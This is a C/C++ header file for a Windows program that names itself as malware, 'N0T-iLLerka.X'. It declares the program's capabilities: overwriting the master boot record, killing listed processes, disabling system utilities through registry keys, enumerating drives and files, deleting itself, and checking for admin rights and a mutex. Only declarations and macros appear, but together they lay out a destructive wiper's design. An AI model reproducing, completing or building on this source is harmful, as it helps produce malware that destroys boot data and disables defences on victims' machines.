//// N0T-iLLerka.h : N0T-iLLerka.X's main Header File ///////////////////////////////////////////////////////////////////////////////////////////////
#pragma once

//// Compiler/Linker ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

//// Interenal Dependencies /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Sub-Headers/settings.h"
#include "Sub-Headers/nt.h"
#include "Sub-Headers/resource.h"

//// Libraries //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

//// Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// General Macros //
#define szMALWR_NAME L"N0T-iLLerka.X [.niX]"

// ErrorHandler Macros //
#if DEBUG_MSG == TRUE
	#define szFORMAT L"%s returned with Errorcode:\n%d : %s"
	#define cbMAX_HEAP_SIZE 0x7d0
#endif // DEBUG_MSG

// FileSystem Macros //
#define nDRIVES 0x1a * 0x4
#define nMBR_SIZE 0x200

// Registry Macros //
#define szREGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define HKLM 0x1
#define HKCU 0x2

// Utilitie Macros //
#define nMIN_RS_LEN 0x8
#define nMAX_RS_LEN 0x10
#define nMAX_BUFFER_SIZE 0x2000000
#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X[.niX]:Argv:/host.Proc(running)"

//// Wrapper Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
#if DEBUG_MSG == TRUE
	#define fnMESSAGEHANDLERW(lpCaption, lpText, lpFunction, uType, ...) fnMessageHandlerW(lpCaption, lpText, NULL, lpFunction, uType, __VA_ARGS__)
//	#define fnMESSAGEHANDLERW(lpCaption, wTextID, lpFunction, uType, ...) fnMessageHandlerW(lpCaption, wTextID, lpFunction, uType, __VA_ARGS__)
#else
	#define fnMESSAGEHANDLERW(lpCaption, lpText, lpFunction, uType, ...)
#endif // DEBUG_MSG

//// Structures/Typedefinitions /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
typedef struct _REGLOAD {
	HKEY    hKeyHK;
	LPCWSTR lpSubKey;
	BOOL    bWow32;
	LPCWSTR lpValueName;
	DWORD   dwType;
	DWORD   dwValue;
} REGLOAD;

//// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
extern LPCWSTR szWarningMSG;

extern WCHAR szCd[MAX_PATH];
extern WCHAR szMfn[MAX_PATH];

extern const WCHAR szCharSet[];
extern const SIZE_T culCharSet;

extern LPCWSTR szKillProcs[];
extern const SIZE_T culKillProcs;

extern const REGLOAD rlDisableKeys[];
extern const SIZE_T culDisableKeys;

//// Function Declarations //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// ErrorHandling Function //
#if DEBUG_MSG == TRUE
	VOID fnMessageHandlerW(
		_In_opt_ LPCWSTR lpCaption,
		_In_opt_ LPCWSTR lpText,
		_In_opt_ WORD    wTextID,
		_In_opt_ LPCWSTR lpFunction,
		_In_opt_ UINT    uType,
		_In_opt_         ...
	);
#endif // DEBUG_MSG

// FileSystem Functions //
BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn
);
BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>* vszDrive
);
BOOL fnDirectoryIteratorW(
	_In_    LPCWSTR                    szDir,
	_In_    LPCWSTR                    szMask,
	_Inout_ std::vector<std::wstring>* vszDir,
	_Inout_ std::vector<std::wstring>* vszFile
);
BOOL fnSelfDeleteW(VOID);
#if KILL_MBR == TRUE
	BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// GenRandom Functions //
INT fnCryptGenRandomNumber(VOID);
std::wstring fnCryptGenRandomStringW(
	_In_ INT nLen
);

// Protection Functions //

// Registry Functions //
BOOL fnCreateRegistryKeyW(
	_In_     HKEY    hKeyHK,
	_In_     LPCWSTR lpSubKey,
	_In_     BOOL    bWow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD   dwType,
	_In_opt_ DWORD   dwValue
);
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
);
#if PROTECTIONS == TRUE
	BOOL fnDisableUtilities(VOID);
#endif // !DISABLE_PROTECTIONS

// Resource Functions //
BOOL fnExtractResourceW(
	_In_ WORD    wResID,
	_In_ LPCWSTR lpResType,
	_In_ LPCWSTR lpFileName
);
LPVOID fnLoadResourceW(
	_In_  WORD    wResID,
	_In_  LPCWSTR lpResType,
	_Out_ LPDWORD dwBufferSize
);
BOOL fnSaveResourceW(
	_In_ LPCWSTR lpFileName,
	_In_ LPVOID  lpBuffer,
	_In_ DWORD   dwBufferSize
);

// Synchronization Functions //
#if SYNCHRONIZATION == TRUE
	BOOL fnCheckMutexW(
		_In_ LPCWSTR lpName
	);
	HANDLE fnCheckSemaphoreW(
		_In_ LPCWSTR lpName
	);
#endif // !DISABLE_SYNCHRONIZATION

// Utilitie Functions //
BOOL fnIsUserAdmin(VOID);